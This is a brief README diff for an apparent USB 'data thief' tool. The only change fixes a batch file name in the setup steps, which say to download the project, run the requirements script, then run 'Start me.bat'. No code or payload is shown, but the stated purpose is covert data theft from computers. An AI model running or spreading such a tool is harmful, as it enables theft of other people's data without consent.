@@ -8,7 +8,7 @@ Turn your usb flash drive to proffesional data thief. <br>
 
 Download the zip file or clone it
 
-launch requirement.bat to install requirements --- wait.
+launch requirements.bat to install requirements --- wait.
 
 then launch Start me.bat Boom  all done!!
 
